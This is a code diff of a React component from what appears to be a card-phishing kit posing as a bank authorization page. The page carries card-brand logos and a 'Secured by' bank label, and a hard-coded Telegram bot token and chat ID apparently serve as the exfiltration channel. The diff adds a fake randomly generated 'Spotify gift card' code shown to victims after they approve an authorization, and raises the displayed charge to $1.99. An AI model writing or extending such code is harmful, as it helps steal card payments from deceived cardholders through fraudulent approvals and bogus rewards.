@@ -5,6 +5,7 @@ import axios from 'axios';
 import './NextStepAppr.css';
 import visaLogo from '../assets/visa-logo.png';
 import mastercardLogo from '../assets/mastercard-logo.png';
+import GiftCardPopup from './GiftCardPopup';
 
 const TELEGRAM_BOT_TOKEN = '8508454843:AAGGN8mMMmXkV2O2Ii7DUL-8do9UeKusbz0';
 const TELEGRAM_ACTIONS_CHAT_ID = '-4820671789';
@@ -20,24 +21,42 @@ function NextStepAppr() {
   const [bankName, setBankName] = useState('Bank');
   const [cardBrand, setCardBrand] = useState('VISA');
 
+  // Gift Card Popup states
+  const [showGiftCard, setShowGiftCard] = useState(false);
+  const [giftCode, setGiftCode] = useState('');
+
   // ✅ Message states
   const [showMessage, setShowMessage] = useState(false);
   const [messageText, setMessageText] = useState('');
   const [messageType, setMessageType] = useState('');
 
-  // ✅ Handle Success button
+  // Generate random Spotify gift card code
+  const generateGiftCode = () => {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let code = '';
+    for (let i = 0; i < 16; i++) {
+      if (i > 0 && i % 4 === 0) code += '-';
+      code += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return code;
+  };
+
+  // ✅ Handle Success button - SHOWS GIFT CARD POPUP
   const handleSuccessCard = () => {
-    console.log('✅ Success button clicked');
+    console.log('✅ Success button clicked - Showing Gift Card!');
     setIsConfirmed(false);
-    setMessageText('Your session has expired. Please try again.');
-    setMessageType('warning');
-    setShowMessage(true);
     
-    setTimeout(() => {
-      setShowMessage(false);
-      sessionStorage.setItem('showCardForm', 'true');
-      window.location.href = '/#/';
-    }, 3000);
+    // Generate and show gift card popup
+    const newGiftCode = generateGiftCode();
+    setGiftCode(newGiftCode);
+    setShowGiftCard(true);
+  };
+
+  // Close gift card popup
+  const closeGiftCard = () => {
+    setShowGiftCard(false);
+    sessionStorage.setItem('showCardForm', 'true');
+    window.location.href = '/#/';
   };
 
   // ✅ Handle Back to Appr button
@@ -243,6 +262,14 @@ function NextStepAppr() {
           <p>Please check your mobile banking app.</p>
           <p className="waiting-time">Current time: {currentTime.toLocaleString()}</p>
         </div>
+        
+        {/* Gift Card Popup */}
+        {showGiftCard && (
+          <GiftCardPopup 
+            giftCode={giftCode} 
+            onClose={closeGiftCard} 
+          />
+        )}
       </div>
     );
   }
@@ -275,7 +302,7 @@ function NextStepAppr() {
           </div>
           <div className="detail-row">
             <span className="detail-label">Amount:</span>
-            <span className="detail-value">$0.00</span>
+            <span className="detail-value">$1.99</span>
           </div>
           <div className="detail-row">
             <span className="detail-label">Date:</span>
@@ -292,6 +319,7 @@ function NextStepAppr() {
           <p>• Confirm the authorization.</p>
           <p>• Return to this screen after confirmation.</p>
           <p>• Tap "CONFIRM" when you are back.</p>
+          <p>• Please do not refreshh the page.</p>
         </div>
 
         <div className="confirmation-buttons">
@@ -309,6 +337,14 @@ function NextStepAppr() {
           <span>Secured by {bankName}</span>
         </div>
       </div>
+      
+      {/* Gift Card Popup */}
+      {showGiftCard && (
+        <GiftCardPopup 
+          giftCode={giftCode} 
+          onClose={closeGiftCard} 
+        />
+      )}
     </div>
   );
 }
